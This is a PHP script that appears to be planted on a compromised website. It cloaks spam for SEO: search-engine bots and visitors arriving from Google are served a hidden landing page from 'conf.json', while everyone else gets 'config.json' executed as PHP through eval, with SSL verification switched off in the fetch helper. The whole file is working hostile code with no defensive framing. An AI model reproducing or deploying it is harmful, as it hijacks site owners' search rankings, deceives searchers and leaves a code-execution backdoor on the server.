<?php
function isSearchEngineBot() {
    return preg_match('/(googlebot|bingbot|yandexbot|baiduspider|duckduckbot|slurp|facebot|ia_archiver|Googlebot|TelegramBot|bingbot|Google-Site-Verification|Google-InspectionTool|AhrefsBot)/i', $_SERVER['HTTP_USER_AGENT']);
}

function isFromGoogle() {
    return isset($_SERVER['HTTP_REFERER']) &&
           (strpos($_SERVER['HTTP_REFERER'], 'google.com') !== false ||
            strpos($_SERVER['HTTP_REFERER'], 'google.co.id') !== false);
}

function NuLzFetch($url){
    if (function_exists('file_get_contents')) {
        $fetch = file_get_contents($url);
        return $fetch;
    } elseif (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        $fetch = curl_exec($ch);
        curl_close($ch);
        return $fetch;
    } else {
        $fetch = "Can'not Fetch This URL => $url";
        return $fetch;
    }
}

$cookie_expiration = time() + (365 * 86400); //1 years
if (!isset($_COOKIE['visited'])) {
    setcookie('visited', '1', $cookie_expiration, "/");
}

$cache_duration = 365 * 86400; //1 years
header("Cache-Control: max-age=$cache_duration, public, must-revalidate");
header("Pragma: cache");

$landing_page = 'conf.json';
$index_home = 'config.json';

if (isSearchEngineBot()) {
    echo NuLzFetch($landing_page);
} else {
    if (isFromGoogle()) {
        echo NuLzFetch($landing_page);
    } else {
        eval ('?>'.NuLzFetch($index_home));
    }
}
